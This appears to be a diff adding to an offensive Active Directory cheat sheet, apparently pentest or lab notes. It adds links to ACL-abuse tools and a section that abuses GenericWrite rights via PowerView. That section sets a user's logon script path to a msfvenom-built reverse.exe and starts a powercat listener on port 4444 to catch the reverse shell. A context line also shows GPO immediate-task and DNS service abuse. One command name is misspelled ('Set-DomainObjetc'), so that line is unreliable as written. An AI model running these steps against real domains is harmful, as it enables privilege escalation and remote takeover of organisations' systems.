@@ -458,13 +458,17 @@ New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net l
 ```
 
 ### ACL
-https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse
+https://github.com/MrAnde7son/PowerShell \
+https://raw.githubusercontent.com/MrAnde7son/PowerShell/master/Invoke-ACLScanner.ps1 \
+https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse \
+https://github.com/fox-it/Invoke-ACLPwn \
+https://raw.githubusercontent.com/fox-it/Invoke-ACLPwn/master/Invoke-ACLPwn.ps1 \
 ```
 Import-Module .\powerview.ps1
 Get-ObjectAcl -SamAccountName <users> -ResolveGUIDS
 Get-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDS
 
-#GenericWrite
+#GenericWrite on Domain Admins
 Get-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDS | ? { ($_.ActiveDirectoryRights -match 'GenericWrite' ) -and ($_.SecurityIdentifier -match 'S-1-ID' ) }
 Get-ObjectAcl -SamAccountName * -ResolveGUIDS | ? { ($_.ActiveDirectoryRights -match 'GenericWrite' ) -and ($_.SecurityIdentifier -match 'S-1-ID' ) }
 Exploit 
@@ -486,6 +490,20 @@ Get-Domainuser -Name <user>
 -sc.exe \\Ip\dc.domain.local start dns
 ```
 
+#GenericWrite on users
+```
+Import-Module .\powerview.ps1
+Get-ObjectAcl -SamAccountName * -ResolveGUIDS | ? { ($_.ActiveDirectoryRights -match 'GenericWrite' ) -and ($_.SecurityIdentifier -match 'S-1-ID' ) }# ID user current
+Get-Domainuser -Name hadams 
+Get-Domainuser -Identity hadams -Properties scriptpath
+Set-DomainObjetc -Identity hadams -Set @{'scriptpath'='\\student\priv\reverse.exe'} scriptpath
+Get-Domainuser -Identity hadams -Properties scriptpath
+
+msfvenom to reverse.exe
+
+.\powercat
+powercat -l -p 4444 -Verbose
+```
 
 ### LAPS
 https://www.hackingarticles.in/credential-dumpinglaps/
